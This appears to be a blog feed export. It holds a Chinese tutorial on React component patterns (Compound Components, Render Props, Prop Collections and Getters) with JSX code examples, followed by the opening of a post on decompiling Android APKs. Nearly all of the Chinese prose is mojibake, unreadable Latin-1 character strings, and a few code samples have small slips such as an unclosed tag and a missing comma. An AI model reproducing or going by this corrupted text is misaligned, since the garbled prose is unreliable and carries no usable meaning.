æ‰€è¬‚çš„ Patternï¼Œä»£è¡¨çš„æ‡‰è©²æ˜¯ã€è¢«åˆ†é–€åˆ¥é¡éï¼Œé€šéåè¦†ä½¿ç”¨èˆ‡æ¸¬è©¦çš„è€ƒé©—ï¼Œä¸”å¤šæ•¸äººçŸ¥æ›‰çš„ç¨‹å¼è¨­è¨ˆç¶“é©—ç¸½çµã€ï¼Œå¦‚æœèªªï¼Œä½ ä»Šå¤©æ¡ç”¨çš„ Pattern æ˜¯åœ˜éšŠå…§çš„äººéƒ½èƒ½æ¥å—ä¸¦ç†è§£çš„ï¼Œç„¶å¾Œä¹Ÿéƒ½åŒæ„è©²æƒ…å¢ƒä¸‹éå¸¸é©åˆä½¿ç”¨é‚£ç¨® Patternï¼Œéä»–è«å±¬ï¼Œç›´æ¥æ‰“è¶´å…¶ä»–ç°¡å–®åšæ³•çš„å„ªç¼ºé»ï¼Œé‚£éº¼ä½¿ç”¨ Pattern æ˜¯çµ•å°æœ‰å¥½è™•çš„ï¼Œé™¤äº†æ¸¬è©¦çš„ç©©å®šæ€§ã€ç¨‹å¼ç¢¼çš„é‡ç”¨æ€§å¤–ï¼Œåœ¨é–‹ç™¼å…±ç”¨ component æˆ–å¥—ä»¶ä¸Šï¼Œæ›´æœ‰åŠ©æ–¼ä¸€èˆ¬å…ƒä»¶ä½¿ç”¨è€…ï¼Œåƒæ˜¯å¯ä»¥ export å‡ºæ›´åŠ ç°¡æ½”ã€æ–¹ä¾¿çš„ API ç­‰ç­‰ã€‚
è‹¥ä¸æ˜¯ä¸Šè¿°æƒ…æ³ï¼Œæœ‰é“æ˜¯ã€æœ€å¥½çš„ Patternï¼Œå°±æ˜¯æ²’æœ‰ Patternã€ï¼Œè®“é‚è¼¯å–®ç´”ç°¡å–®ã€ä¸å½±éŸ¿æ•ˆèƒ½ã€æ–¹ä¾¿æ¥æ‰‹çš„äººé€²è¡Œç¶­è­·ï¼Œå¯èƒ½æ¯”èµ·åˆ»æ„å¥—ç”¨ Pattern ä¾†å¾—æœ‰æ•ˆç›Šã€‚æ‰€ä»¥åœ¨é–‹ç™¼å‰ï¼Œæœ€å¥½èŠ±é»æ™‚é–“é‡æ¸…è‡ªå·±çš„ç‹€æ³ã€‚
ä¸éï¼Œä½ ä¹Ÿå¾—å…ˆäº†è§£æœ‰å“ªäº› Patternsï¼Œæ‰èƒ½åœ¨é–‹ç™¼æ™‚æœ‰åƒè€ƒä¾æ“šéº»ï¼æ‰€ä»¥ä¸ç®¡ä½ ç¾åœ¨ç”¨ä¸ç”¨å¾—åˆ°ï¼Œå¤šå­¸é‚„æ˜¯å¥½çš„ï¼
React Component Patternsä¸»è¦æƒ³ä»‹ç´¹çš„ React Component Pattern æœ‰å¹¾ç¨®ï¼š

Compound comopnent
Render props comopnent
Prop Collections and Getters
State Initializers
State Reducer
Control Props
Provider
Higher-order component

ä½†ç¤™æ–¼ç¯‡å¹…é—œä¿‚ï¼Œæ‰“ç®—æ‹†æˆå¹¾ç¯‡æ–‡ç« ä¾†èªªæ˜ï¼Œä»Šå¤©æ˜¯ä¸Šç¯‡ï¼Œæœƒä»‹ç´¹åˆ° Compound componentã€Render props component èˆ‡ Prop Collections and Gettersã€‚
Compound componentå‡è¨­ä»Šå¤©ä½ è¦æ’°å¯«ä¸€å€‹ Toggle Componentï¼Œä¸¦ä¸”åˆ†åˆ¥åœ¨ state On æˆ– Off æ™‚ï¼Œèƒ½å¤ é¡¯ç¤ºä¸åŒçš„æ–‡å­—æè¿°ï¼Œä½ æœƒæ€éº¼åšï¼Ÿ
ä¸€å€‹å¾ˆç›´è¦ºçš„åšæ³•æ˜¯ï¼Œåˆ©ç”¨ props ä¾†å‚³éä¸åŒ state æ™‚æ‰€éœ€è¦é¡¯ç¤ºçš„æ–‡å­—ï¼ˆåªæ˜¯å‘ˆç¾ ideaï¼Œä¸¦éæœ‰åŠŸèƒ½çš„ codeï¼‰ï¼š
class Toggle extends React.Component &#123;  state = &#123; on: false &#125;  render() &#123;    const &#123; whenOn, whenOff &#125; = this.props;    return this.state.on ? whenOn : whenOff;  &#125;&#125;&lt;Toggle  whenOn=&quot;Toggle is on&quot;  whenOff=&quot;Toggle is off&quot;/&gt;

é€™æ¨£åšç•¶ç„¶å¯è¡Œï¼Œä½†æœ‰å¹¾å€‹æ˜é¡¯çš„å£è™•ï¼š

é †åºç„¡æ³•èª¿å‹•ï¼šæ²’è¾¦æ³•è®“ Toggle component çš„ä½¿ç”¨è€…è‡ªç”±å¾—èª¿æ•´ whenOn èˆ‡ whenOff çš„é¡¯ç¤ºé †åºï¼Œé™¤éä½ å¦å¤–åŠ å…¥å…¶ä»– props ä¾†æ§åˆ¶ã€‚
åˆ©ç”¨ Props ä¾†å‚³é UI å…ƒä»¶çš„è©±ï¼Œå®¹æ˜“é€ æˆä½¿ç”¨è€…å›°æ“¾ï¼Œåªèƒ½ç›¡é‡é€é props çš„å‘½åä¾†å€åˆ¥ UI å…ƒä»¶èˆ‡å…¶ä»–ç‹€æ…‹æ§åˆ¶çš„ prosï¼Œèˆ‰ä¾‹ä¾†èªªï¼Œå¦‚æœä»Šå¤© Toggle é‚„æœ‰ä¸€å€‹ props æ˜¯ä¾†æ§åˆ¶ toggle on æ™‚çš„ callbackï¼š  &lt;Toggle  whenOn=&quot;Toggle is on&quot;  whenOff=&quot;Toggle is off&quot;ï½€  whenOnCallback=&#123;() =&gt; console.log(&#x27;yeee, I am on&#x27;)&#125;/&gt;
  çœ‹èµ·ä¾†å°±ä¸æ˜¯ä¸€å€‹éå¸¸å¥½çš„ API è¨­è¨ˆï¼Œå°å§ï¼Ÿ

è¦è§£æ±ºé€™ç¨®æƒ…æ³ï¼Œæœ€é©åˆçš„æ–¹å¼å°±æ˜¯æ¡ç”¨ Compound componentï¼
æ‰€è¬‚çš„ Compound component å°±æ˜¯è®“ä½ çš„ UI å…ƒä»¶é€é this.props.children çš„æ–¹å¼å‚³å…¥çµ¦ parent componentï¼Œåˆ©ç”¨ React.Children.map() ä¾† render æ‰€æœ‰å‚³å…¥çš„ this.props.childrenï¼Œä¸¦ä¸”é€é React.cloneElement å°‡ parent çš„ state å‚³å…¥æ¯å€‹ children çš„ propsï¼Œè®“ parent èˆ‡ children ä¹‹é–“æœƒ éš±å«è‘—ç‹€æ…‹çš„å…±äº«ï¼Œå°æ–¼å…ƒä»¶ä½¿ç”¨è€…ä¾†èªªï¼Œä»–åªéœ€è¦å‚³å…¥æƒ³è¦çš„ children componentï¼Œä¸ç”¨çŸ¥é“ parent èˆ‡ children ä¹‹é–“å¦‚ä½•æºé€šï¼Œç•¶ç„¶ä¹Ÿèƒ½éš¨æ„èª¿æ•´é †åºï¼Œé€™æ¨£çš„ API è¨­è¨ˆï¼Œå°æ–¼å…ƒä»¶ä½¿ç”¨è€…å°±éå¸¸çš„å‹å–„ã€‚
åœ¨é€™æ¨£çš„åŸå‰‡ä¸‹ï¼Œä¸é›£ç™¼ç¾ï¼ŒCompound component å¿…é ˆè¦ åŒæ™‚çµåˆä½¿ç”¨ parent component èˆ‡ children component æ‰æœ‰æ„ç¾©ã€‚
ä»¥å‰›å‰›çš„ &lt;Toggle&gt; ç‚ºä¾‹å­ï¼Œè‹¥æ”¹ä»¥ Compound component çš„è©±ï¼š
class Toggle extends React.Component &#123;  static On = (&#123; on, children &#125;) =&gt; on &amp;&amp; children;  static Off = (&#123; on, children &#125;) =&gt; !on &amp;&amp; children;  static Button = (&#123; on, toggle &#125;) =&gt; &lt;button onClick=&#123;toggle&#125; /&gt;  static defaultProps = &#123; onToggle: () =&gt; &#123; &#125; &#125;  state = &#123; on: false &#125;  toggle = () =&gt;    this.setState(      (&#123; on &#125;) =&gt; (&#123; on: !on &#125;),      () =&gt; this.props.onToggle(this.state.on),    )  render() &#123;    const children = React.Children.map(      this.props.children,      child =&gt;        React.cloneElement(child, &#123;          on: this.state.on,          toggle: this.toggle,        &#125;),    )    return &lt;div&gt;&#123;children&#125;&lt;/div&gt;  &#125;&#125;&lt;Toggle  onToggle=&#123;on =&gt; console.log(&#x27;toggle&#x27;, on)&#125;&gt;  &lt;Toggle.On&gt;The button is on&lt;/Toggle.On&gt;  &lt;Toggle.Off&gt;The button is off&lt;/Toggle.Off&gt;  &lt;Toggle.Button /&gt;&lt;/Toggle&gt;

Demo link
æˆ‘å€‘é€é Toggle Class çš„ static properties ä¾†å®šç¾© children componentï¼Œé€™æ¨£çš„å¥½è™•æ˜¯æˆ‘å€‘èƒ½å¤ å¾åç¨±ä¸Šå°±ä¿æŒ Parent èˆ‡ Children Component ä¹‹é–“çš„é—œè¯æ€§ã€‚
é€é Compound Componentï¼Œä¸åƒ…èƒ½è®“ä½¿ç”¨è€…è‡ªè¨‚å…ƒä»¶é †åºï¼Œåˆèƒ½å°‡ UI component èˆ‡å…¶ä»– callback props åšå€‹æ¸…æ¥šçš„åˆ‡å‰²ã€‚å°æ–¼ä½¿ç”¨è€…ä¾†èªªï¼Œå®Œå…¨ä¸éœ€è¦ç®¡ Toggle çš„ state è®ŠåŒ–æ™‚ï¼ŒToggle.On è¦æ€éº¼è®Šå‹•ï¼Œä»–å€‘ä¹‹é–“çš„ state èˆ‡ props éƒ½ç”± Parent component è™•ç†ã€‚
å¦å¤–ï¼Œåœ¨ Kent C. Dodds çš„ workshop ä¸­ï¼Œæœ‰äººæå•ç‚ºä½•ä¸ç›´æ¥ç”¨ this.props.children.map å°±å¥½ï¼Œè€Œè¦ç”¨ React.Children.mapï¼Ÿ
åŸå› åœ¨æ–¼ï¼Œåœ¨ç›®å‰ React çš„å¯¦ä½œä¸­ï¼Œç•¶ä½ çš„ children åªæœ‰ä¸€å€‹æ™‚ï¼Œthis.props.children ä¸æœƒæ˜¯ä¸€å€‹ arrayï¼Œé€é React.Children.map èƒ½å¯«å¾—æ›´ç°¡æ½”ï¼Œå°‘äº›åˆ¤æ–·ã€‚
çœ‹åˆ°é€™é‚Šï¼Œä¸çŸ¥é“æœ‰æ²’æœ‰æƒ³åˆ°ï¼Œå…¶å¯¦æˆ‘å€‘åœ¨æ’°å¯«è¡¨å–®æ™‚å¸¸ç”¨çš„ &lt;select&gt; èˆ‡ &lt;option&gt; å°±æ˜¯ä¸€å€‹ Compound component çš„ä¾‹å­ï¼š
&lt;select&gt;  &lt;option&gt;Opt 1&lt;option&gt;  &lt;option&gt;Opt 2&lt;option&gt;&lt;/select&gt;

æ›´æœ‰å½ˆæ€§çš„ Compound Componentåœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œå…¶å¯¦åªè¦ä½¿ç”¨è€…æ›´å‹•å…¶ä¸­ä¸€å€‹ childrenï¼Œæ•´å€‹ Compound component å°±æœƒå£æ‰ï¼š
&lt;Toggle  onToggle=&#123;on =&gt; console.log(&#x27;toggle&#x27;, on)&#125;&gt;  &lt;Toggle.On&gt;The button is on&lt;/Toggle.On&gt;  &lt;Toggle.Off&gt;The button is off&lt;/Toggle.Off&gt;  &lt;div&gt;    &lt;Toggle.Button /&gt;  &lt;/div&gt;&lt;/Toggle&gt;

å› ç‚º React.Children.map åªæœƒ for-loop åˆ°ç¬¬ä¸€å±¤çš„ childrenï¼Œä¹Ÿå°±æ˜¯èªªï¼ŒReact.cloneElement ç¾åœ¨ä¸æœƒè¤‡è£½ &lt;Toggle.Button&gt; è€Œæ˜¯è¤‡è£½ &lt;div&gt; äº†ã€‚
ä¸éå¥½åœ¨ç¾åœ¨æœ‰äº† React 16 çš„ Context APIï¼Œè¦è§£æ±ºé€™å€‹å•é¡Œç°¡å–®äº†ä¸å°‘ï¼Œä¸»è¦å°±æ˜¯å°‡ state çš„å…±äº«æ”¹ç”± Context ä¾†å®Œæˆï¼š
const ToggleContext = React.createContext(&#123;  on: false,  toggle: () =&gt; &#123;&#125;&#125;);class Toggle extends React.Component &#123;  static On = (&#123; children &#125;) =&gt; (    &lt;ToggleContext.Consumer&gt;      &#123;contextValue =&gt; contextValue.on &amp;&amp; children&#125;    &lt;/ToggleContext.Consumer&gt;  );  static Off = (&#123; children &#125;) =&gt; (    &lt;ToggleContext.Consumer&gt;      &#123;contextValue =&gt; !contextValue.on &amp;&amp; children&#125;    &lt;/ToggleContext.Consumer&gt;  );  static Button = () =&gt; (    &lt;ToggleContext.Consumer&gt;      &#123;contextValue =&gt; &lt;button onClick=&#123;contextValue.toggle&#125;&gt; Toggle &lt;/button&gt;&#125;    &lt;/ToggleContext.Consumer&gt;  );  static defaultProps = &#123; onToggle: () =&gt; &#123;&#125; &#125;;  state = &#123; on: false &#125;;  toggle = () =&gt;    this.setState(      (&#123; on &#125;) =&gt; (&#123; on: !on &#125;),      () =&gt; this.props.onToggle(this.state.on)    );  render() &#123;    // ç”±æ–¼ä¸ç”¨å‚³é props çµ¦ childrenï¼Œä¹Ÿå°±ä¸ç”¨ React.Children.map äº†ï¼Œç›´æ¥ä½¿ç”¨ this.props.children å³å¯    return (      &lt;ToggleContext.Provider        value=&#123;&#123;          on: this.state.on,          toggle: this.toggle        &#125;&#125;      &gt;        &#123;this.props.children&#125;      &lt;/ToggleContext.Provider&gt;    );  &#125;&#125;&lt;Toggle onToggle=&#123;on =&gt; console.log(&quot;toggle&quot;, on)&#125;&gt;  &lt;Toggle.On&gt;The button is on&lt;/Toggle.On&gt;  &lt;Toggle.Off&gt;The button is off&lt;/Toggle.Off&gt;  &lt;div&gt;    &lt;Toggle.Button /&gt;  &lt;/div&gt;&lt;/Toggle&gt;

Demo Link
å¦‚æ­¤ä¸€ä¾†ï¼Œä½¿ç”¨è€…æƒ³è¦åœ¨æˆ‘å€‘çš„ Componet è£¡é¢å¦‚ä½• wrap å„å€‹ Child Component éƒ½å¯ä»¥äº†ï¼
Note: åœ¨ workshop ä¸­ï¼ŒKent C. Dodds æœ‰æåˆ°é—œæ–¼åœ¨ render æ™‚ï¼Œ Provider æ¯æ¬¡éƒ½æœƒæ¥æ”¶åˆ°æ–° objectï¼Œé€ æˆå¤šé¤˜ re-render çš„å•é¡Œï¼Œå› æ­¤å¯ä»¥åšé»å°æ”¹è‰¯ï¼šå°‡è¦å‚³çµ¦ Provider çš„ value æ”¹ä»¥ this.state å‚³å…¥ï¼Œé€™æ¨£æ¯æ¬¡åœ¨ render Toggle æ™‚ï¼Œæ‰ä¸æœƒè®“æ‰€æœ‰ Toggle çš„ children component ä¹Ÿ re-renderã€‚åªæ˜¯è¦ç‰¹åˆ¥æ³¨æ„ä½ åŸæœ¬è¦å‚³å…¥ context çš„ value å…§ï¼Œè‹¥æœ‰ä¸€äº› function å¦‚ this.toggleï¼Œè¨˜å¾—ç¢ºä¿ä½ çš„ state åœ¨å®£å‘Šæ™‚èƒ½å–å¾—åˆ°ã€‚
//...toggle = () =&gt;  this.setState(    (&#123; on &#125;) =&gt; (&#123; on: !on &#125;),    () =&gt; this.props.onToggle(this.state.on)  );state = &#123; on: false, toggle: this.toggle &#125;; // å°‡ state ç§»è‡³ toggle function ä¹‹ä¸‹ï¼Œä»¥ç¢ºä¿ refer å¾—åˆ°render() &#123;  // ç”±æ–¼ä¸ç”¨å‚³é props çµ¦ childrenï¼Œä¹Ÿå°±ä¸ç”¨ React.Children.map äº†ï¼Œç›´æ¥ä½¿ç”¨ this.props.children å³å¯  return (    &lt;ToggleContext.Provider      value=&#123;this.state&#125;    &gt;      &#123;this.props.children&#125;    &lt;/ToggleContext.Provider&gt;  );&#125;//...

ä¸éç•¶ä½ ä¸¦ä¸æƒ³æŠŠæ‰€æœ‰ state éƒ½æ”¾å…¥ context æ™‚ï¼Œå¯èƒ½å°±å¾—æƒ³å¦ä¸€ç¨®æ–¹æ³•äº†ã€‚
Render props comopnentRender props ç›¸å°æ–¼ Compound Component ä¾†èªªæ‡‰è©²æ˜¯æ¯”è¼ƒæœ‰åçš„ Patternï¼Œè€Œä»–çš„æ¦‚å¿µèˆ‡å¯¦ä½œæ–¹å¼ä¹Ÿç›¸å°ç°¡å–®ï¼Œç¶²è·¯ä¸Šä¹Ÿæ—©æœ‰é‡å° Render props çš„ç›¸é—œè¨è«–ï¼Œåƒé€™å€‹æˆ–é€™å€‹ã€‚
å¾åç¨±å°±å¯ä»¥çŒœå‡ºä¸€äºŒï¼Œæ‰€è¬‚ Render props å°±æ˜¯å°‡ render function ç•¶ä½œ props å‚³å…¥ï¼Œè®“åŸæœ¬çš„ render function çš„æ§åˆ¶æ¬Šï¼Œå¾å…§éƒ¨å…ƒä»¶æœ¬èº«ç§»è½‰è‡³ä½¿ç”¨è©²å…ƒä»¶çš„ä½¿ç”¨è€…èº«ä¸Šï¼Œé€™ç¨®æ–¹å¼è®“ä½¿ç”¨å…ƒä»¶çš„ä½¿ç”¨è€…å¯ä»¥æ›´æ–¹ä¾¿çš„æ“ä½œ ï½€stateï¼Œè€Œå¯¦ä½œæ–¹å¼ä¸Šæ¯”è¼ƒå¸¸çœ‹åˆ°çš„æœ‰å…©ç¨®ï¼š

å°‡ render ç•¶ä½œ props å‚³å…¥ï¼š
  class Toggle extends React.Component &#123;  static defaultProps = &#123; onToggle: () =&gt; &#123; &#125; &#125;  state = &#123; on: false &#125;  toggle = () =&gt;    this.setState(      (&#123; on &#125;) =&gt; (&#123; on: !on &#125;),      () =&gt; this.props.onToggle(this.state.on),    )  render() &#123;    return this.props.renderToggle(&#123;on: this.state.on, toggle: this.toggle&#125;);  &#125;&#125;&lt;Toggle  onToggle=&#123;on =&gt; console.log(&#x27;toggle&#x27;, on)&#125;  renderToggle=&#123;(&#123;on, toggle&#125;) =&gt; (    &lt;div&gt;      &#123;on ? &#x27;The button is on&#x27; : &#x27;The button is off&#x27;&#125;      &lt;hr /&gt;      &lt;buttononClick=&#123;toggle&#125;&gt;        &#123;on ? &#x27;click on&#x27; : &#x27;click off&#x27;&#125;      &lt;/button&gt;    &lt;/div&gt;  )&#125;/&gt;

ç”¨ this.props.children ä¾†å‘¼å« render propsï¼š
  class Toggle extends React.Component &#123;    static defaultProps = &#123; onToggle: () =&gt; &#123; &#125; &#125;    state = &#123; on: false &#125;    toggle = () =&gt;      this.setState(        (&#123; on &#125;) =&gt; (&#123; on: !on &#125;),        () =&gt; this.props.onToggle(this.state.on),      )    render() &#123;      return this.props.children(&#123;on: this.state.on, toggle: this.toggle&#125;);    &#125;  &#125;  &lt;Toggle    onToggle=&#123;on =&gt; console.log(&#x27;toggle&#x27;, on)&#125;  &gt;    &#123;(&#123;on, toggle&#125;) =&gt; (      &lt;div&gt;        &#123;on ? &#x27;The button is on&#x27; : &#x27;The button is off&#x27;&#125;        &lt;hr /&gt;        &lt;button onClick=&#123;toggle&#125;&gt;          &#123;on ? &#x27;click on&#x27; : &#x27;click off&#x27;&#125;        &lt;/button&gt;      &lt;/div&gt;    )&#125;  &lt;/Toggle&gt;

Demo Link
ä»¥é€™å…©ç¨®æ–¹æ³•ä¾†èªªï¼Œæˆ‘çš„æƒ³æ³•èˆ‡ Kent C. Dodds ç›¸åŒï¼Œä»¥ this.props.children ä¾†å‘¼å« render props åœ¨ä½¿ç”¨ä¸Šæ¯”è¼ƒæœ‰å„ªå‹¢ï¼Œé™¤äº†å¯ä»¥æ˜ç¢ºçŸ¥é“ Toggle å…ƒä»¶çš„èµ·å§‹é»å¤–ï¼Œé‚„å¯ä»¥é¿å… ç•¶ renderProps çš„å…§å®¹å¾ˆå¤šæ™‚ï¼Œå®¹æ˜“ miss æ‰ä¸€äº› Toggle çš„é‡è¦ props çš„å•é¡Œï¼Œä¾‹å¦‚ä¸‹é¢çš„ç¯„ä¾‹ï¼š


Prop Collections and Gettersåœ¨ Kent C. Dodds çš„ workshop ä¸­æ‰€æåˆ°çš„ Prop Collections èˆ‡ Prop Getters å…¶å¯¦æ˜¯è¦æ­é…é‹ç”¨çš„ã€‚
æˆ‘å€‘å°‡ä¸Šé¢çš„ä¾‹å­ç¨å¾®æ”¹è®Šä¸€ä¸‹ï¼š
&lt;Toggle onToggle=&#123;on =&gt; console.log(&quot;toggle&quot;, on)&#125;&gt;  &#123;(&#123; on, toggle &#125;) =&gt; (    &lt;div&gt;      &#123;on ? &quot;The button is on&quot; : &quot;The button is off&quot;&#125;      &lt;hr /&gt;      &lt;button class=&quot;button1&quot; onClick=&#123;toggle&#125; aria-pressed=&#123;on&#125;&gt;        &#123;on ? &quot;click on&quot; : &quot;click off&quot;&#125;      &lt;/button&gt;      &lt;hr /&gt;      &lt;button class=&quot;button2&quot; onClick=&#123;toggle&#125; aria-pressed=&#123;on&#125; aria-label=&quot;custom-button2&quot;&gt;        &#123;on ? &quot;click on&quot; : &quot;click off&quot;&#125;      &lt;/button&gt;    &lt;/div&gt;  )&#125;&lt;/Toggle&gt;

ç¾åœ¨æˆ‘å€‘æœ‰å…©å€‹ button å¯ä»¥åŒæ™‚æ›´æ”¹ Toggle çš„ç‹€æ…‹ï¼Œè€Œç¨å¾®æ³¨æ„ä¸€ä¸‹å¯ä»¥ç™¼ç¾å…©å€‹ button å…¶å¯¦æ¥æ”¶çš„ props æœ‰å…±é€šçš„éƒ¨ä»½ï¼Œç›®å‰çš„å¯«æ³•å¾ˆå¤šé¤˜ï¼Œä¹Ÿä¸å¥½çœ‹ã€‚é€™æ™‚å€™æˆ‘å€‘å°±å¯ä»¥å‰µé€ ä¸€å€‹ Prop collections ä¾†è² è²¬æä¾› Common çš„ propsï¼š
class Toggle extends React.Component &#123;  //... Same as before  getStateAndHelpers() &#123;    return &#123;      on: this.state.on,      togglerProps: &#123; // collection for common Props        &quot;aria-pressed&quot;: this.state.on,        onClick: this.toggle      &#125;    &#125;;  &#125;  render() &#123;    return this.props.children(this.getStateAndHelpers());  &#125;&#125;

è€Œå‰›å‰›çš„ç¯„ä¾‹å°±èƒ½ä¿®æ”¹ç‚ºï¼š
&lt;Toggle onToggle=&#123;on =&gt; console.log(&quot;toggle&quot;, on)&#125;&gt;  &#123;(&#123; on, togglerProps &#125;) =&gt; (    &lt;div&gt;      &#123;on ? &quot;The button is on&quot; : &quot;The button is off&quot;&#125;      &lt;hr /&gt;      &lt;button class=&quot;button1&quot; &#123;...togglerProps&#125;&gt;        &#123;on ? &quot;click on&quot; : &quot;click off&quot;&#125;      &lt;/button&gt;      &lt;hr /&gt;      &lt;button        class=&quot;button2&quot;        &#123;...togglerProps&#125;        aria-label=&quot;custom-button2&quot;      &gt;        &#123;on ? &quot;click on&quot; : &quot;click off&quot;&#125;      &lt;/button&gt;    &lt;/div&gt;  )&#125;&lt;/Toggle&gt;

ä½†é€™æ¨£åšä½ å¯èƒ½æœƒç™¼ç¾ä¸€å€‹ç¼ºé»ï¼Œå°±æ˜¯ç•¶åˆ¥äººä¸å°å¿ƒ overwrite ä½ çš„ common props æ™‚ï¼Œä½ ç„¡èƒ½ç‚ºåŠ›ã€‚é€™å…¶å¯¦ä¹Ÿæ˜¯ render props çš„ä¸€å€‹å°ç¼ºé»ï¼Œä¾‹å¦‚ï¼š
&lt;button  class=&quot;button1&quot;  &#123;...togglerProps&#125;  onClick=&#123;() =&gt; &#x27;overwrite&#x27;&#125; // è“‹éæˆ‘å€‘åŸå…ˆåœ¨ onClick çš„æ“ä½œ (this.toggle)&gt;  &#123;on ? &quot;click on&quot; : &quot;click off&quot;&#125;&lt;/button&gt;

é€™æ™‚å€™ Prop Getters å°±å¯ä»¥å‡ºå‹•äº†ï¼åœ¨åŸæœ¬çš„ Prop collectionsï¼ˆtogglerPropsï¼‰ä¸­ï¼Œæˆ‘å€‘æ”¹ä»¥å‘¼å«ä¸€å€‹ Prop Getter çš„æ–¹å¼å–å¾— common propsï¼š
class Toggle extends React.Component &#123;  //... Same as before  getTogglerProps = (&#123; onClick, ...props &#125; = &#123;&#125;) =&gt; (&#123;    &#x27;aria-pressed&#x27;: this.state.on,    onClick: () =&gt; &#123;      this.toggle();      onClick &amp;&amp; onClick();    &#125;,    ...props,  &#125;)  getStateAndHelpers() &#123;    return &#123;      on: this.state.on,      getTogglerProps: this.getTogglerProps    &#125;;  &#125;  render() &#123;    return this.props.children(this.getStateAndHelpers());  &#125;&#125;

å¦‚æ­¤ä¸€ä¾†ï¼Œä½¿ç”¨è€…æ‰€æä¾›çš„ onClick å°±ä¸æœƒè“‹éæˆ‘å€‘å…ƒä»¶åŸå§‹çš„ onClick è¡Œç‚ºï¼Œä¹Ÿå°±æ˜¯ this.toggleï¼š
&lt;button  class=&quot;button2&quot;  &#123;...getTogglerProps(&#123;    onClick: () =&gt; console.log(&#x27;overwrite&#x27;)  &#125;)&#125;  aria-label=&quot;custom-button2&quot;&gt;  &#123;on ? &quot;click on&quot; : &quot;click off&quot;&#125;&lt;/button&gt;

å¦‚æœæƒ³è¦ overwrite æ›´å¤šçš„ methodï¼Œåœ¨ Prop Getter ä¸­ä¹Ÿè¦åšç›¸å°æ‡‰çš„åˆ¤æ–·èˆ‡ä¿®æ”¹ï¼š
getTogglerProps = (&#123; onClick, otherMethod, ...props &#125; = &#123;&#125;) =&gt; (&#123;  &#x27;aria-pressed&#x27;: this.state.on,  onClick: () =&gt; &#123;    this.toggle();    onClick &amp;&amp; onClick();  &#125;,  otherMethod: () =&gt; &#123;    this.originOtherMethod();    otherMethod &amp;&amp; otherMethod();  &#125;  ...props,&#125;)

å¦‚æœå«Œæ¯æ¬¡éƒ½è¦åˆ¤æ–·å‚³å…¥çš„ props æ˜¯å¦å­˜åœ¨å¾ˆéº»ç…©ï¼Œå¯ä»¥å­¸ Kent C. Dodds å¯«ä¸€å€‹ handy funtionï¼š
const callAll = (...fns) =&gt; (...args) =&gt;  fns.forEach(fn =&gt; fn &amp;&amp; fn(...args));getTogglerProps = (&#123; onClick, otherMethod, ...props &#125; = &#123;&#125;) =&gt; (&#123;  &#x27;aria-pressed&#x27;: this.state.on,  onClick: callAll(onClick, this.toggle),&#125;)

Demo Link
çµè«–ä»Šå¤©çµ±æ•´äº†ä¸‰å€‹ React component patterns: Compound Componentã€Render Props èˆ‡ Prop Collections &amp; Gettersï¼Œè®“æˆ‘è‡ªå·±å°é€™å¹¾å€‹ pattern æ›´ç†Ÿæ‚‰äº†ä¸€äº›ï¼Œä¸éé‚„æ˜¯è¦ç›¡é‡é‹ç”¨åœ¨è‡ªå·±çš„å°ˆæ¡ˆç•¶ä¸­ï¼Œæ‰èƒ½ç¢ºåˆ‡æ„Ÿå—å…¶å¥½è™•ï¼Œä¸¦æ›´å¾—å¿ƒæ‡‰æ‰‹ã€‚ä¹Ÿå¸Œæœ›é€™äº›æ•´ç†å°ä¾†åˆ°é€™é‚Šçš„è®€è€…æœ‰æ‰€å¹«åŠ©ï¼Œå‰©ä¸‹çš„å¹¾å€‹ Pattern æœƒé™¸çºŒè£œä¸Šï¼Œæ±ºä¸é£Ÿè¨€ï¼
æœ€å¾Œï¼Œå†æ¬¡å‘¼ç±²å¤§å®¶å»çœ‹çœ‹ Kent C. Dodds çš„å½±ç‰‡ Advanced React Patternsï¼Œæˆ‘æ¯”è¼ƒæ¨è–¦çœ‹ workshop çš„ç‰ˆæœ¬ï¼Œå› ç‚ºé‚„å¯ä»¥è½åˆ°ç¾å ´å…¶ä»–äººå°ä»–çš„æå•ï¼Œä»¥åŠä»–çš„å›ç­”ï¼Œéƒ½å¾ˆæœ‰å¹«åŠ©ï¼
è³‡æ–™ä¾†æº
Advanced React Patterns workshop
Advanced React Patterns V2 codesandbox
Advanced React Patterns Blog
ä»€éº¼æ˜¯è¨­è¨ˆæ¨¡å¼
Answers to common questions about render props
Do more with less using render props

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>react</tag>
        <tag>es6</tag>
        <tag>javascript</tag>
        <tag>pattern</tag>
      </tags>
  </entry>
  <entry>
    <title>äººäººéƒ½æœƒçš„ Android Apk åç·¨è­¯</title>
    <url>/2016/03/24/android-decompile-introduction/</url>
    <content><![CDATA[å°æ–¼ Android å·¥ç¨‹å¸«ä¾†èªªï¼Œäº†è§£å¦‚ä½•åç·¨è­¯å¯ä»¥å¢é€²è‡ªå·±å° Android åº•å±¤çš„ç†è§£ï¼Œä¹Ÿå¯ä»¥æ€è€ƒå¦‚ä½•ä¿è­·è‡ªå·±çš„ apk ä¸è¢«åç·¨è­¯ã€‚
å°æ–¼ä¸€èˆ¬äººä¾†èªªï¼Œè¨±å¤šç¾æˆçš„å·¥å…·å¯ä»¥å¹«åŠ©æˆ‘å€‘éå¸¸è¼•é¬†çš„ã€åªè¦æ‰“æ‰“å¹¾å€‹æŒ‡ä»¤å°±å¯ä»¥åç·¨è­¯ apkï¼Œçœ‹åˆ° java source codeï¼Œæ»¿è¶³è‡ªå·±çš„å¥½å¥‡å¿ƒã€‚
æœ¬ç¯‡æ–‡ç« åªä»‹ç´¹ä¸€äº›å·¥å…·çš„ä½¿ç”¨ï¼Œé©åˆåˆå­¸è€…è§€çœ‹ã€‚è‹¥æ˜¯æƒ³äº†è§£æ›´åº•å±¤çš„çŸ¥è­˜ï¼Œå¯ä»¥åƒè€ƒæ–‡æœ«é™„ä¸Šçš„å»¶ä¼¸é–±è®€ã€‚
äº‹å‰æº–å‚™é¦–å…ˆï¼Œæˆ‘å€‘éœ€è¦ä¸€å€‹ç”¨ä¾†è¢«ç ´è§£çš„ apkï¼Œç°¡å–®ç”¨ä»»ä½•ä½ å¹³å¸¸ç†Ÿæ‚‰çš„å·¥å…·è‡ªå·± build ä¸€å€‹å°±å¥½äº†ã€‚åŸºæœ¬æ¶æ§‹å¾ˆç°¡å–®ï¼Œåªè¦ä¸€å€‹ MainActivity è·Ÿå…©å€‹TextViewå°±å¥½ï¼š
